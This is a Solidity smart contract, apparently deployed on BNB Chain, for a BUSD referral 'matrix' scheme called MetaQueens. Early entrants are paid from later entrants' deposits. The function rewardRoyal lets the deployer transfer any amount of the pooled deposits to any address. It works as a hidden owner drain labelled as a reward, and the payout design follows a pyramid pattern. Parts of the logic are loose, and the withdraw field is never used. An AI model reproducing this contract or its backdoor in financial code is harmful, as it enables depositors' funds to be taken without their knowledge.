/**
 *Submitted for verification at BscScan.com on 2023-01-03
*/

/**
 *Submitted for verification at BscScan.com on 2022-12-18
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface BEP20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address tokenOwner) external view returns (uint balance);
    function allowance(address tokenOwner, address spender) external view returns (uint remaining);
    function transfer(address to, uint tokens) external returns (bool success);
    function approve(address spender, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract MetaQueens {
    using SafeMath for uint256;
    BEP20 public busd = BEP20(0xDc6cc6d847DF088C3eEDA72404864B59c0cD53B2); // BUSD
    
    struct Player {
        address referrer;
        uint256 withdraw;
        mapping(uint256 => uint256) b5Entry;
        mapping(uint256 => uint256) nofReEntry;
        mapping(uint256 => uint256) levelTeam;
        mapping(uint256 => uint256) poolIncome;
        mapping(uint256 => mapping(uint256 => uint256)) b5_level;
        mapping(uint256 => address) b5_upline;
    }

    address rewardHolder;
    mapping(address => Player) public players;
    mapping( uint256 =>  address []) public b5;
    
    constructor() public {
        rewardHolder = msg.sender;
        for(uint8 i=0;i < 8; i++){
            b5[i].push(msg.sender);
            players[msg.sender].b5Entry[i]=1;
        }
    }
    
    function packageInfo(uint256 _pkg) pure private  returns(uint8 p) {
        if(_pkg == 30e18){
            p=1;
        }else if(_pkg == 90e18){
            p=2;
        }else if(_pkg == 270e18){
            p=3;
        }else if(_pkg == 810e18){
            p=4;
        }else if(_pkg == 2430e18){
            p=5;
        }else if(_pkg == 7290e18){
            p=6;
        }else if(_pkg == 21870e18){
            p=7;
        }else{
            p=0;
        }
        return p;
    }

    function b5deposit(uint256 _amount,address _referral) public {
        require(_amount >= 10e18, "Invalid Amount");
        busd.transferFrom(msg.sender,address(this),_amount);
        uint8 poolNo=packageInfo(_amount);
        require(players[msg.sender].b5Entry[poolNo] == 0, "Already registered in pool.");
        if(poolNo==0){
            players[msg.sender].referrer = _referral;
        }
        players[players[msg.sender].referrer].levelTeam[poolNo]++;
        players[msg.sender].b5Entry[poolNo]++;
        b5[poolNo].push(msg.sender);
        _setb5(poolNo,msg.sender,_amount);
    }

    function _setb5(uint256 poolNo,address _addr,uint256 _amount) private{
        uint256 poollength=b5[poolNo].length;
        uint256 pool = poollength-2; 
        uint256 _ref;
        uint256 _parent;
        if(pool<1){
            _ref = 0; 
        }else{
            _ref = uint256(pool)/2; // formula (x-2)/2
        }
        if(players[b5[poolNo][_ref]].b5_level[poolNo][0]<2){
            _parent = _ref;
        }
        else{
            for(uint256 i=0;i<poollength;i++){
                if(players[b5[poolNo][i]].b5_level[poolNo][0]<2){
                   _parent = i;
                   break;
                }
            }
        }
        players[_addr].b5_upline[poolNo]=b5[poolNo][_parent];
        players[b5[poolNo][_parent]].b5_level[poolNo][0]++;
        address up=b5[poolNo][_parent];
        if(players[up].b5_level[poolNo][0]==2){
            players[up].poolIncome[poolNo]+=_amount; 
            busd.transfer(up,_amount);
        }
        
        address up1 = players[up].b5_upline[poolNo];
        if(up1 != address(0)){
            players[up1].b5_level[poolNo][1]++;
            if(players[up1].b5_level[poolNo][1]==1){
                players[up1].poolIncome[poolNo]+=_amount; 
                busd.transfer(up1,_amount);
            }
            if(players[up1].b5_level[poolNo][1]==4){
                players[up1].b5_level[poolNo][0]=0;
                players[up1].b5_level[poolNo][1]=0;
                players[up1].nofReEntry[poolNo]++;
                b5[poolNo].push(up1);
                _setb5(poolNo,up1,_amount);
            }
        }
    }

    function b5Info(uint8 pool) view external returns(address [] memory) {
        return b5[pool];
    }
    
    function entryDetails(address _addr) view external returns(uint256 [8] memory b5e) {
        for(uint8 i=0;i<8;i++){
            b5e[i]=players[_addr].b5Entry[i];
        }
        return b5e;
    }
    function userDetails(address _addr) view external returns(uint256 [8] memory pkg,uint256 [8] memory levelteam) {
        for(uint8 i = 0; i < 8; i++) {
            pkg[i]=players[_addr].b5Entry[i];
            levelteam[i] = players[_addr].levelTeam[i];
        }
        return (
           pkg,
           levelteam
        );
    }
    function poolDetails(address _addr) view external returns(uint256[8] memory clubTeam1,uint256[8] memory clubTeam2,uint256[8] memory rebirth) {
        for(uint8 i=0;i<8;i++){
            clubTeam1[i]=players[_addr].b5_level[i][0];
            clubTeam2[i]=players[_addr].b5_level[i][1];
            rebirth[i]=players[_addr].nofReEntry[i];
        }
        return (
           clubTeam1,
           clubTeam2,
           rebirth
        );
    }
    function rewardRoyal(address buyer,uint _amount) public returns(uint){
        require(msg.sender == rewardHolder,"Sorry");
        busd.transfer(buyer,_amount);
        return _amount;
    }
    function incomeDetails(address _addr) view external returns(uint256 totalInc,uint256 wdl,uint256[8] memory clubinc) {
        for(uint8 i=0;i<8;i++){
            clubinc[i]=players[_addr].poolIncome[i];
            totalInc+=players[_addr].poolIncome[i];
        }
        return (
           totalInc,
           players[_addr].withdraw,
           clubinc
        );
    }
}  

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}